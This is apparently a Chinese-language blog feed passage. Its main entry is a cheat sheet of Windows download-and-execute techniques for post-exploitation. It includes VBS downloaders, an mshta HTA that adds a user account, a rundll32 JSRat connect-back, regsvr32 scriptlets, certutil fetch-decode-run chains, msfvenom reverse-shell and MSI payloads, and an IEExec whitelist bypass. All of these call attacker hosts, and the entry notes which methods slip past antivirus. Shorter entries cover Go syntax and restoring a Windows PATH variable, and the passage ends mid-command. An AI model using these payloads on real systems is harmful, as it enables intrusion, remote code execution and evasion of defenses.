class="string">&quot;Msxml2.XMLHTTP&quot;</span>) &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">Set</span> Shell = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>) &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> Post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.203.140/a.ps1&quot;</span>,<span class="number">0</span> &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> Post.Send() &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">Set</span> aGet = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>) &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.Mode = <span class="number">3</span> &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.Type = <span class="number">1</span> &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.Open() &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.Write(Post.responseBody) &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.SaveToFile <span class="string">&quot;D:/a.ps1&quot;</span>,<span class="number">2</span> &gt;&gt;download.vbs</span><br></pre></td></tr></table></figure><p>第二种保存脚本后再下载指定文件。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">set</span> a=createobject(^<span class="string">&quot;adod^&quot;</span>+^<span class="string">&quot;b.stream^&quot;</span>):<span class="built_in">set</span> w=createobject(^<span class="string">&quot;micro^&quot;</span>+^<span class="string">&quot;soft.xmlhttp^&quot;</span>):w.open^<span class="string">&quot;get^&quot;</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>  &gt;&gt; downfile.vbs</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cscript downfile.vbs http://<span class="number">192.168</span>.<span class="number">203.140</span>/a.ps1 D:\\tomcat8.<span class="number">5</span>\\webapps\\x.ps1</span><br></pre></td></tr></table></figure><h2 id="mshta命令下载执行"><a href="#mshta命令下载执行" class="headerlink" title="mshta命令下载执行"></a>mshta命令下载执行</h2><p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mshta vbscript:Close(Execute(<span class="string">&quot;GetObject(&quot;</span><span class="string">&quot;script:http://webserver/payload.sct&quot;</span><span class="string">&quot;)&quot;</span>))</span><br><span class="line"><span class="comment">#下载hta</span></span><br><span class="line">mshta http://webserver/payload.hta</span><br></pre></td></tr></table></figure><h3 id="payload-hta"><a href="#payload-hta" class="headerlink" title="payload.hta"></a>payload.hta</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;cmd.exe /c net user test password /add&quot; // 这里填写命令</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HEAD&gt; </span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><h2 id="ipc-文件共享"><a href="#ipc-文件共享" class="headerlink" title="ipc$文件共享"></a>ipc$文件共享</h2><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立远程IPC连接</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">28.128</span>\ipc<span class="variable">$</span> /user:administrator <span class="string">&quot;abc123!&quot;</span></span><br><span class="line"><span class="comment">#复制远程文件到本地主机</span></span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">28.128</span>\c<span class="variable">$</span>\<span class="number">2</span>.txt D:\test</span><br></pre></td></tr></table></figure><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 127.0.0.1</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">get file</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h2><p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p><blockquote><p>tftp32服务端下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html">http://tftpd32.jounin.net/tftpd32_download.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tftp -i 你的IP get 要下载文件 存放位置</span><br></pre></td></tr></table></figure><h2 id="rundll32命令下载执行"><a href="#rundll32命令下载执行" class="headerlink" title="rundll32命令下载执行"></a>rundll32命令下载执行</h2><p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p><blockquote><p>项目地址：<a href="https://github.com/Hood3dRob1n/JSRat-Py.git">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p></blockquote><p>步骤一：开始运行JSRat，监听本地8888端口。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209172232324.png" alt="img" style="zoom:50%;" /><p>步骤二：通过url访问，可以查看恶意代码。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209172232197.png" alt="img"></p><p>复制代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.28.131:8888/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure><p>步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209172233525.png" alt="img"></p><blockquote><p>参考：<a href="https://github.com/3gstudent/Javascript-Backdoor">https://github.com/3gstudent/Javascript-Backdoor</a></p></blockquote><h2 id="net中的regasm命令下载执行"><a href="#net中的regasm命令下载执行" class="headerlink" title="net中的regasm命令下载执行"></a>net中的regasm命令下载执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll</span><br></pre></td></tr></table></figure><h2 id="cmd的远程命令下载："><a href="#cmd的远程命令下载：" class="headerlink" title="cmd的远程命令下载："></a>cmd的远程命令下载：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd.exe /k &lt; \webdavserver\folder\batchfile.txt</span><br></pre></td></tr></table></figure><h2 id="regsvr32命令下载执行"><a href="#regsvr32命令下载执行" class="headerlink" title="regsvr32命令下载执行"></a>regsvr32命令下载执行</h2><p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在目标机上执行：</span></span><br><span class="line">regsvr32 /u /n /s /i:http://webserver/js.png scrobj.dll</span><br></pre></td></tr></table></figure><h3 id="js-png"><a href="#js-png" class="headerlink" title="js.png"></a>js.png</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    progid=&quot;ShortJSRAT&quot;</span><br><span class="line">    classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">    &lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">            ps  = &quot;cmd.exe /c calc.exe&quot;;</span><br><span class="line">            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span><br><span class="line">        ]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure><h2 id="certutil命令下载执行"><a href="#certutil命令下载执行" class="headerlink" title="certutil命令下载执行"></a>certutil命令下载执行</h2><p>用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p><blockquote><p>注：</p><ul><li>缓存目录为：”%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content”</li><li>certutil命令详情参考：<a href="https://learn.microsoft.com/en-us/previous-versions/orphan-topics/ws.10/cc773087(v=ws.10)?redirectedfrom=MSDN">https://learn.microsoft.com/en-us/previous-versions/orphan-topics/ws.10/cc773087(v=ws.10)?redirectedfrom=MSDN</a></li></ul></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载文件</span></span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">28.128</span>/imag/evil.txt test.php</span><br><span class="line"><span class="comment">#删除缓存</span></span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">28.128</span>/imag/evil.txt delete</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://webserver/payload.b64 payload.b64 &amp; certutil <span class="literal">-decode</span> payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\InstallUtil /logfile= /LogToConsole=false /u payload.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://webserver/payload.b64 payload.b64 &amp; certutil <span class="literal">-decode</span> payload.b64 payload.exe &amp; payload.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp;  <span class="built_in">del</span> a.exe &amp;&amp; certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">254.102</span>:<span class="number">80</span>/a delete</span><br></pre></td></tr></table></figure><h2 id="net中的MSBulid命令下载执行"><a href="#net中的MSBulid命令下载执行" class="headerlink" title="net中的MSBulid命令下载执行"></a>net中的MSBulid命令下载执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot;</span><br></pre></td></tr></table></figure><h2 id="odbcconf命令下载执行"><a href="#odbcconf命令下载执行" class="headerlink" title="odbcconf命令下载执行"></a>odbcconf命令下载执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">odbcconf /s /a &#123;regsvr \\webdavserver\folder\payload_dll.txt&#125;</span><br></pre></td></tr></table></figure><h2 id="cscript脚本远程命令下载执行"><a href="#cscript脚本远程命令下载执行" class="headerlink" title="cscript脚本远程命令下载执行"></a>cscript脚本远程命令下载执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript //E:jscript \\webdavserver\folder\payload.txt</span><br></pre></td></tr></table></figure><h3 id="downfile-vbs"><a href="#downfile-vbs" class="headerlink" title="downfile.vbs:"></a>downfile.vbs:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; Set your settings</span><br><span class="line"></span><br><span class="line">strFileURL = &quot;http://www.it1.net/images/it1_logo2.jpg&quot;</span><br><span class="line"></span><br><span class="line">strHDLocation = &quot;c:\logo.jpg&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27; Fetch the file</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line"></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If objXMLHTTP.Status = 200 Then</span><br><span class="line"></span><br><span class="line">Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line"></span><br><span class="line">objADOStream.Open</span><br><span class="line"></span><br><span class="line">objADOStream.Type = 1 &#x27;adTypeBinary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line"></span><br><span class="line">objADOStream.Position = 0&#x27;Set the stream position to the start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Set objFSO = Createobject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line"></span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line"></span><br><span class="line">Set objFSO = Nothing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line"></span><br><span class="line">objADOStream.Close</span><br><span class="line"></span><br><span class="line">Set objADOStream = Nothing</span><br><span class="line"></span><br><span class="line">End if</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP = Nothing</span><br></pre></td></tr></table></figure><p>将以上保存为downfile.vbs</p><p>输入命令：cscript downfile.vbs</p><h2 id="pubprn-vbs下载执行命令"><a href="#pubprn-vbs下载执行命令" class="headerlink" title="pubprn.vbs下载执行命令"></a>pubprn.vbs下载执行命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:&lt;https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct&gt;</span><br></pre></td></tr></table></figure><h2 id="windows自带命令copy"><a href="#windows自带命令copy" class="headerlink" title="windows自带命令copy"></a>windows自带命令copy</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy \x.x.x.x\xx\poc.exe</span><br><span class="line">xcopy d:\test.exe \x.x.x.x\test.exe</span><br></pre></td></tr></table></figure><h2 id="IEXPLORE-EXE命令下载执行-需要IE存在oday"><a href="#IEXPLORE-EXE命令下载执行-需要IE存在oday" class="headerlink" title="IEXPLORE.EXE命令下载执行(需要IE存在oday)"></a>IEXPLORE.EXE命令下载执行(需要IE存在oday)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Program Files\Internet Explorer\IEXPLORE.EXE&quot; &lt;http://site.com/exp&gt;</span><br></pre></td></tr></table></figure><h2 id="IEEXC命令下载执行"><a href="#IEEXC命令下载执行" class="headerlink" title="IEEXC命令下载执行"></a>IEEXC命令下载执行</h2><p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成Payload：</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用管理员身份打开cmd，分别运行下面两条命令。</span></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.<span class="number">0.50727</span>&gt;caspol.exe <span class="literal">-s</span> off</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.<span class="number">0.50727</span>&gt;IEExec.exe http://<span class="number">192.168</span>.<span class="number">28.131</span>/evil.exe</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/">https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</a></p></blockquote><h2 id="msiexec命令下载执行"><a href="#msiexec命令下载执行" class="headerlink" title="msiexec命令下载执行"></a>msiexec命令下载执行</h2><p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成msi包</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/exec CMD=<span class="string">&#x27;net user test abc123! /add&#x27;</span> <span class="operator">-f</span> msi &gt; evil.msi</span><br><span class="line"><span class="comment">#远程执行</span></span><br><span class="line">msiexec /q /i http://<span class="number">192.168</span>.<span class="number">28.128</span>/evil.msi</span><br></pre></td></tr></table></figure><h2 id="下载命令执行项目GreatSCT"><a href="#下载命令执行项目GreatSCT" class="headerlink" title="下载命令执行项目GreatSCT"></a>下载命令执行项目GreatSCT</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;https://github.com/GreatSCT/&gt;</span><br></pre></td></tr></table></figure><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</p><blockquote><p>wget.exe下载：<a href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O &quot;evil.txt&quot; http://192.168.28.128/imag/evil.txt</span><br></pre></td></tr></table></figure><h2 id="MSXSL-EXE"><a href="#MSXSL-EXE" class="headerlink" title="MSXSL.EXE"></a>MSXSL.EXE</h2><p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p><blockquote><p>下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p></blockquote><p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl</span><br><span class="line">demo.xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;</span><br><span class="line">&lt;customers&gt;</span><br><span class="line">&lt;customer&gt;</span><br><span class="line">&lt;name&gt;Microsoft&lt;/name&gt;</span><br><span class="line">&lt;/customer&gt;</span><br><span class="line">&lt;/customers&gt;</span><br><span class="line">exec.xsl</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot;</span><br><span class="line">xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;</span><br><span class="line">xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;</span><br><span class="line">   function xml(nodelist) &#123;</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);</span><br><span class="line">   return nodelist.nextNode().xml;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&lt;/msxsl:script&gt;</span><br><span class="line">&lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure><h2 id="pubprn-vbs"><a href="#pubprn-vbs" class="headerlink" title="pubprn.vbs"></a>pubprn.vbs</h2><p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&quot; 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span><br><span class="line">test.sct</span><br><span class="line"></span><br><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    description=&quot;Bandit&quot;</span><br><span class="line">    progid=&quot;Bandit&quot;</span><br><span class="line">    version=&quot;1.00&quot;</span><br><span class="line">    classid=&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">    remotable=&quot;true&quot;</span><br><span class="line">    &gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>经过多方测试，vbs不会遭到360拦截，certutil也可能不会拦截。通用性最强的还是 bitsadmin。另外bitadmin有个 powershell 版本，万一cmd版本真的给微软弃用了，可以替代。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO语言学习</title>
      <link href="/%E7%9F%A5%E8%AF%86/Coder/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Coder/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h1><ul><li>需要注意的是 <strong>{</strong> 不能单独放在一行，所以以下代码在运行时会产生错误：</li></ul><blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">**<span class="keyword">package</span>** main</span><br><span class="line"></span><br><span class="line">**<span class="keyword">import</span>** <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> </span><br><span class="line">&#123; *<span class="comment">// 错误，&#123; 不能在单独的行上*</span></span><br><span class="line">  fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Coder </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>win10误删环境变量Path的几种恢复方法</title>
      <link href="/%E7%9F%A5%E8%AF%86/Windows/win10%E8%AF%AF%E5%88%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FPath%E7%9A%84%E5%87%A0%E7%A7%8D%E6%81%A2%E5%A4%8D%E6%96%B9%E6%B3%95.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Windows/win10%E8%AF%AF%E5%88%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FPath%E7%9A%84%E5%87%A0%E7%A7%8D%E6%81%A2%E5%A4%8D%E6%96%B9%E6%B3%95.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>因为在添加环境变量的时候，不小心将原环境变量覆盖掉的了，导致很多程序不能正常运行~~</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加到系统环境变量</span></span><br><span class="line">setx path <span class="string">&quot;%PATH%;F:\Learning\ComputerScience\Code\GO;D:\Program Files\Go\bin&quot;</span> </span><br></pre></td></tr></table></figure><p>这是所犯的错误，%PATH%并没有产生变量的效果（原本是想在PATH后面追加变量的）</p><p>那么怎么恢复修改的环境变量呢？</p><h1 id="Windows环境变量简单介绍"><a href="#Windows环境变量简单介绍" class="headerlink" title="Windows环境变量简单介绍"></a>Windows环境变量简单介绍</h1><p>Windows系统中有两种环境变量：用户变量和系统变量。系统变量与用户变量的PATH是为了告诉系统可执行文件放在什么路径（平常执行程序的路径，要放在PATH里面，当系统需要的时候就会去path查找）</p><h2 id="查找规则"><a href="#查找规则" class="headerlink" title="查找规则"></a>查找规则</h2><blockquote><ol><li>windows系统在执行用户命令时，若用户未给出文件的绝对路径，则首先在当前目录下寻找相应的可执行文件、批处理文件等；</li><li>若果当前目录找不到对应文件名的程序，在系统变量的PATH的路径中，依次寻找对应的可执行程序文件（查找顺序是按照路径的录入顺序从左往右寻找的，最前面一条的优先级最高，如果找到程序就停止寻找，后面的路径不再执行）；</li><li>如果系统变量的PATH的路径找不到，再到用户变量的PATH路径中寻找（如果系统变量和用户变量的PATH中同时包含了同一个命令，则优先执行系统变量PATH中的命令）</li></ol></blockquote><h2 id="需要注意的点："><a href="#需要注意的点：" class="headerlink" title="需要注意的点："></a>需要注意的点：</h2><blockquote><ol><li><p>环境变量没有区分大小写，例如path跟PATH是一样的</p></li><li><p>系统变量对所有用户有效；用户变量只对当前用户有效</p></li><li><p>用户变量与系统变量，名称是变量，值是里面的内容，也就是通过变量存储了想要存储的内容，方便调用</p></li><li><p>每次新加了命令以后，要确定保存了。再重启CMD，否则命令不生效的。被修改的系统Path只是同步到了注册表中，并未立即生效，所以可以使用cmd命令行重新得到系统Path。我们下面通过的恢复PATH的方法大都是依赖于还未关闭的终端，在这些未关闭的终端或者IDE中去获取环境变量~~~</p></li><li><p>在CMD里要输出环境变量 ECHO %变量名%</p></li></ol></blockquote><h2 id="命令行添加环境变量"><a href="#命令行添加环境变量" class="headerlink" title="命令行添加环境变量"></a>命令行添加环境变量</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setx命令：在用户或系统环境创建或修改环境变量。能基于参数、注册表项或文件输入设置变量。</span></span><br><span class="line"><span class="comment">#使用/M表示在系统写入，不/M表示写入用户变量</span></span><br><span class="line"><span class="comment">#格式： SETX [/S system [/U [domain\]user [/P [password]]]] var value [/M]</span></span><br><span class="line"><span class="comment">#主要是是var和value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#代码编写位置（管理员权限）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span> /M</span><br><span class="line"><span class="comment">#若被拒绝：（不过这样仅仅是写入用户变量）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span></span><br><span class="line"><span class="comment">#添加到系统环境变量</span></span><br><span class="line">setx path <span class="string">&quot;%PATH%;F:\Learning\ComputerScience\Code\GO;D:\Program Files\Go\bin&quot;</span> </span><br><span class="line"><span class="comment">#注意哦，使用setx修改系统path一定要谨慎，</span></span><br><span class="line"><span class="comment">#如果是在环境变量后面追加值，一定不要忘记带上原变量，否则我们会覆盖掉原变量，而失去原变量。如果要追加在后面的话，一定要setx path &quot;%PATH%;new value&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="查看用户环境变量和系统变量"><a href="#查看用户环境变量和系统变量" class="headerlink" title="查看用户环境变量和系统变量"></a>查看用户环境变量和系统变量</h1><ul><li>查看所有的用户变量</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKCU\Environment /v *</span><br></pre></td></tr></table></figure><ul><li>查看用户变量中的path</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKCU\Environment /v 